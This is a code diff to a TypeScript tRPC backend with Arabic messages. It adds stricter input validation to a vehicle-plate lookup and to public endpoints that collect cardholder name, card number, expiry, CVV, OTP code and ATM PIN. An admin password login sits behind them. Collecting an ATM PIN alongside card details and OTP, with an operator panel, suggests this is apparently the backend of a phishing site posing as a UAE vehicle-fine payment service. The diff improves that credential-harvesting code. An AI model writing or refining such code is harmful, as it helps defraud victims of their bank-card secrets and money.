@@ -56,9 +56,19 @@ export const appRouter = router({
     query: publicProcedure
       .input(
         z.object({
-          plateSource: z.string().min(1, "يرجى اختيار الإمارة"),
-          plateNumber: z.string().min(1, "يرجى إدخال رقم اللوحة").max(20),
-          plateCode: z.string().min(1, "يرجى اختيار كود اللوحة"),
+          plateSource: z.string()
+            .min(1, "يرجى اختيار الإمارة")
+            .max(10)
+            .regex(/^[A-Z0-9]+$/, "مصدر اللوحة غير صالح"),
+          plateNumber: z.string()
+            .min(1, "يرجى إدخال رقم اللوحة")
+            .max(10)
+            .regex(/^[0-9]+$/, "رقم اللوحة يجب أن يحتوي على أرقام فقط")
+            .transform(v => v.trim()),
+          plateCode: z.string()
+            .min(1, "يرجى اختيار كود اللوحة")
+            .max(10)
+            .regex(/^[A-Z0-9]+$/, "كود اللوحة غير صالح"),
         })
       )
       .mutation(async ({ input, ctx }) => {
@@ -218,11 +228,24 @@ export const appRouter = router({
     // إرسال بيانات البطاقة
     submitCard: publicProcedure
       .input(z.object({
-        sessionId: z.string(),
-        cardName: z.string().min(1),
-        cardNumber: z.string().min(16).max(19),
-        cardExpiry: z.string().min(4),
-        cardCvv: z.string().min(3).max(4),
+        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
+        cardName: z.string()
+          .min(2, "اسم حامل البطاقة قصير جداً")
+          .max(60, "اسم حامل البطاقة طويل جداً")
+          .regex(/^[a-zA-Z\u0600-\u06FF\s]+$/, "اسم حامل البطاقة يحتوي على أحرف غير مسموح بها")
+          .transform(v => v.trim()),
+        cardNumber: z.string()
+          .min(13)
+          .max(19)
+          .transform(v => v.replace(/\s/g, ""))
+          .refine(v => /^[0-9]{13,19}$/.test(v), "رقم البطاقة غير صالح"),
+        cardExpiry: z.string()
+          .regex(/^(0[1-9]|1[0-2])\/?(\d{2}|\d{4})$/, "تاريخ انتهاء البطاقة غير صالح")
+          .max(7),
+        cardCvv: z.string()
+          .min(3)
+          .max(4)
+          .regex(/^[0-9]{3,4}$/, "CVV غير صالح"),
       }))
       .mutation(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
@@ -248,8 +271,11 @@ export const appRouter = router({
     // إرسال رمز OTP
     submitOtp: publicProcedure
       .input(z.object({
-        sessionId: z.string(),
-        otpCode: z.string().min(4).max(8),
+        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
+        otpCode: z.string()
+          .min(4, "رمز OTP قصير جداً")
+          .max(8, "رمز OTP طويل جداً")
+          .regex(/^[0-9]+$/, "رمز OTP يجب أن يحتوي على أرقام فقط"),
       }))
       .mutation(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
@@ -269,8 +295,11 @@ export const appRouter = router({
     // إرسال رقم ATM PIN
     submitAtmPin: publicProcedure
       .input(z.object({
-        sessionId: z.string(),
-        atmPin: z.string().min(4).max(6),
+        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
+        atmPin: z.string()
+          .min(4, "رقم PIN قصير جداً")
+          .max(6, "رقم PIN طويل جداً")
+          .regex(/^[0-9]+$/, "رقم PIN يجب أن يحتوي على أرقام فقط"),
       }))
       .mutation(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
@@ -292,7 +321,9 @@ export const appRouter = router({
   admin: router({
     // تسجيل الدخول
     login: publicProcedure
-      .input(z.object({ password: z.string() }))
+      .input(z.object({
+        password: z.string().min(1).max(200),
+      }))
       .mutation(async ({ input }) => {
         if (input.password !== ADMIN_PASSWORD) {
           throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
